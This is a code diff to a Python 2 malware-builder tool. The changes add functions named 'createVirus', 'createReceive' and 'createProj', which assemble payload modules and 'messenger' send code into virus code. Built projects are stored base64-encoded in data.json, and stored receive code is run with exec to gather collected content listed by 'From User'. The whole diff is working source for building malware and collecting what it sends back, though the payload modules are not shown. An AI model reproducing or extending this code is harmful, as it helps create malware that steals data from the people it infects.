@@ -1,4 +1,6 @@
-import re, os, sys, ast, random
+#-*- coding:utf-8 -*-
+
+import re, os, sys, ast, random, base64, time, json
 import astunparse
 from onelinerizer import onelinerize
 
@@ -25,7 +27,9 @@ class utils():
             "name": "",
             "desc": "",
             "sendCode": "",
-            "sendCodeFunc": ""
+            "sendCodeFunc": "",
+            "receiveCode": "",
+            "receiveCodeFunc": ""
         }
         for i in enumerate(fileLines):
             if ";" not in i[1]:
@@ -129,8 +133,8 @@ class utils():
                         elif reReceiveFunc.findall(funcCode):
                             funcName = 'receive%s%s' % (
                                 info["name"], str(random.randint(0,2000)))
-                            receiveCode = onelinerize(reReceiveFunc.sub('def %s(' % funcName,
-                                funcCode))
+                            receiveCode = reReceiveFunc.sub('def %s(' % funcName,
+                                funcCode)
                             exec(receiveCode)
                             info["receiveCode"] = receiveCode
                             info["receiveCodeFunc"] = funcName
@@ -174,6 +178,14 @@ class utils():
         print "[!] Module %s is not available, ignored" % module
         return False
 
+    @staticmethod
+    def visitJSON():
+        try:
+            data = json.loads(open("data.json").read())
+            return data
+        except Exception as e:
+            print "[x] Error in data.json"
+            raise e
 
 class API():
     @staticmethod
@@ -207,7 +219,8 @@ class API():
         return sendInfo
 
     @staticmethod
-    def createVirus(moduleList, sendList, path = None, 
+    def createVirus(moduleList, sendList, 
+        projName,
         sendPath = 'messenger',
         modulePath = "module"):
         moduleInfo = API.getModuleInfo(modulePath)
@@ -216,11 +229,14 @@ class API():
         realSendList = []
         for send in enumerate(sendList):
             if utils.checkAva(send[1], sendInfo):
-                realSendList.append(sendInfo[send[0]])
-
+                for i in sendInfo:
+                    if i["name"] == send[1]:
+                        realSendList.append(i)
         for module in enumerate(moduleList):
             if utils.checkAva(module[1], moduleInfo):
-                realModuleList.append(moduleInfo[module[0]])
+                for i in moduleInfo:
+                    if i["name"] == module[1]:
+                        realModuleList.append(i)
         moduleCode = ""
         sendCode = ""
         execCode = ""
@@ -228,18 +244,106 @@ class API():
             moduleCode += "%s;" % (realModule["sendCode"])
         for realSend in realSendList:
             sendCode += "%s;" % (realSend["sendCode"])
-        for i in moduleInfo:
-            for j in sendInfo:
-                execCode += "%s(%s(), '%s');" % (
+        for i in realModuleList:
+            for j in realSendList:
+                execCode += "%s(%s(), '%s', '%s');" % (
                     j["sendCodeFunc"], i["sendCodeFunc"], 
-                    i["name"])
+                    i["name"], projName)
 
         return moduleCode + sendCode + execCode
 
+    @staticmethod
+    def createReceive(sendList,
+        projName, 
+        sendPath = 'messenger'):
+        sendInfo = API.getSendInfo(sendPath)
+        realSendList = []
+        for send in enumerate(sendList):
+            if utils.checkAva(send[1], sendInfo):
+                for i in sendInfo:
+                    if i["name"] == send[1]:
+                        realSendList.append(i)
+        receiveCode = ""
+        execCode = ""
+        for realSend in realSendList:
+            receiveCode += "%s\n" % (realSend["receiveCode"])
+        
+        for j in realSendList:
+            execCode += "receiveObj = %s(@knicky.RANGE, '%s');" % (
+                    j["receiveCodeFunc"], projName
+                )
+
+        return receiveCode + execCode
+
+    @staticmethod
+    def createProj( 
+        moduleList, sendList, 
+        projName = str(base64.b64encode(str(time.time() + 
+            random.randint(0,20000)))).replace("=", ""),
+        sendPath = 'messenger',
+        modulePath = "module"):
+        print "[*] The project name is %s" % projName
+        data = utils.visitJSON()
+        projects = data["projects"]
+        virusCode = API.createVirus(moduleList, sendList, projName,
+            sendPath, modulePath)
+        receiveCode = API.createReceive(sendList, projName, sendPath)
+        projects.append({
+            "projName" : projName,
+            "virusCode" : base64.b64encode(virusCode),
+            "receiveCode" : base64.b64encode(receiveCode),
+            "time" : time.time()
+        })
+        data["projects"] = projects
+        with open("data.json", "w") as file:
+            json.dump(data, file)
+        print "[*] Success!!"
+        return virusCode
+
+    @staticmethod
+    def listProj():
+        data = utils.visitJSON()
+        result = []
+        for i in data["projects"]:
+            result.append({
+                "name": i["projName"],
+                "time": i["time"]
+            })
+        return result
+
+    @staticmethod
+    def receiveInfo(projName, _range = 10):
+        data = utils.visitJSON()
+        receiveCode = ""
+        for i in data["projects"]:
+            if i["projName"] == projName:
+                receiveCode = base64.b64decode(i["receiveCode"])
+        if receiveCode == "":
+            print "[x] Your entered wrong project name"
+            return []
+        else: 
+            exec(receiveCode\
+                .replace("@knicky.RANGE", str(_range)))
+            return receiveObj
 
 class beautify():
     @staticmethod
-    def b(info):
+    def getTime(timestamp):
+        return time.strftime("%Y-%m-%d %H:%M:%S", 
+                    time.localtime(float(timestamp)))
+    @staticmethod
+    def b64(_str):
+        return base64.b64decode(_str)
+        
+    @staticmethod
+    def tm(result):
+        try:
+            return terminaltables.AsciiTable(result).table
+        except Exception as e:
+            print "Error in terminaltables %s" % e
+
+    @staticmethod
+    def bM(info):
         result = [["Name", "Description", "SupportedOS", "Status"]]
         for i in info:
             if i["success"] == 0:
@@ -248,17 +352,40 @@ class beautify():
                 result.append(
                     [i["name"], i["desc"], i["sys"], "Failed"]
                 )
-        try:
-            return terminaltables.AsciiTable(result).table
-        except:
-            print "Error! Did you install terminaltables"
+        return beautify.tm(result)
     
+    @staticmethod
+    def bC(info):
+        result = [["Name", "Time"]]
+        for i in info:
+            result.append([i["name"], beautify.getTime(i["time"])])
+        return beautify.tm(result)
+    
+    @staticmethod
+    def bR(info):
+        result = [["Module", "From User", "Date", "Content"]]
+        for i in info:
+            result.append([i["_byModule"], i["_from"], 
+                beautify.getTime(i["_date"]), 
+                beautify.b64(i["_content"])])
+        return beautify.tm(result)
+
     @staticmethod
     def getModuleInfo(path='module'):
         info = API.getModuleInfo(path)
-        return beautify.b(info)
+        return beautify.bM(info)
 
     @staticmethod
     def getSendInfo(path='messenger'):
         info = API.getModuleInfo(path)
-        return beautify.b(info)
+        return beautify.bM(info)
+
+    @staticmethod
+    def listProj():
+        info = API.listProj()
+        return beautify.bC(info)
+
+    @staticmethod
+    def receiveInfo(projName, _range = 10):
+        info = API.receiveInfo(projName, _range)
+        return beautify.bR(info)\
